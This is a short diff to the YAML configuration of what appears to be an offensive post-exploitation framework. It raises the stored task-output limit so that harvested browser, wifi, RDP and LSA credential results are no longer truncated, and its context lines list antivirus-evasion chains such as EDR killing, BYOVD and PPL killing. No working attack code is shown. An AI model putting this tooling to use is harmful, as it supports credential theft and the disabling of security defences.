@@ -309,6 +309,15 @@ mcp:
     audit_path: ./logs/mcp-audit.jsonl
     # 出错即拒（默认 true）。
     fail_closed: true
+# ─── 任务结果存储 ─────────────────────────────────────────────────────────────
+# 任务输出/错误**入库**的字节上限（默认 262144 = 256 KiB）。
+# 历史版本把这里写死成 500 字节：凭据分段结果（browser/wifi/rdp/lsa 的 JSON，
+# 正常几十 KB）入库后只剩开头几百字节，重启/回读时界面看着"凭据几乎没拿到"。
+# 现在的行为：超过上限时显式标注 truncated=true + 原始字节数（不静默截断）；
+# 真正的大结果由服务端外置成句柄（见 mcp.result_dir），用 result_read 分页回读，
+# 不把 tasks 表撑大。<=0 回落默认值（不是"不限制"）。
+task:
+    output_max_bytes: 262144
 # ─── 杀软对抗能力分级（AV-Ops，v1.4.0 S6）────────────────────────────────────
 # 把既有的 6 条链（av_detect / edr_blind / edr_kill / byovd_* / ppl_kill / process_kill）
 # 收进一个分级、可审计、fail-closed 的入口：
